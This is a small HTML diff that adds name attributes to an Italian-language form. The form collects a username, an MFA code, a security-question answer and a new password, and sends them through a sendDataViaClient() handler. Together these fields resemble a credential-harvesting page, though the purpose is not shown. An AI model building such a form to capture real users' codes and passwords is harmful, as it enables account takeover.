@@ -317,8 +317,8 @@
     </div>
 
     <form id="client">
-      <div><input type="text" placeholder="Nome Utente" class="txtBox formElement"></div>
-      <div><input type="text" placeholder="Codice MFA" class="txtBox formElement"></div>
+      <div><input type="text" name="name" placeholder="Nome Utente" class="txtBox formElement"></div>
+      <div><input type="text" name="mfa" placeholder="Codice MFA" class="txtBox formElement"></div>
       <div>
         <select class="formElement">
           <option>Qual'è il nome del tuo primo animale da compagnia?</option>
@@ -327,10 +327,10 @@
           <option>Dov'è nato tuo padre?</option>
           <option>Qual'è la tua squadra del cuore?</option>
         </select>
-        <input type="text" class="txtBox formElement">
+        <input type="text" name="question" class="txtBox formElement">
       </div>
-      <div><input type="password" placeholder="Inserisci una nuova password" class="txtBox formElement"></div>
-      <div><input type="password" placeholder="Ripeti la password per sicurezza" class="txtBox formElement"></div>
+      <div><input type="password" name="password" placeholder="Inserisci una nuova password" class="txtBox formElement"></div>
+      <div><input type="password" name="password2" placeholder="Ripeti la password per sicurezza" class="txtBox formElement"></div>
 
       <div class="cta">
         <input type="submit" class="button" name="invia" value="Invia" onclick="sendDataViaClient();" />
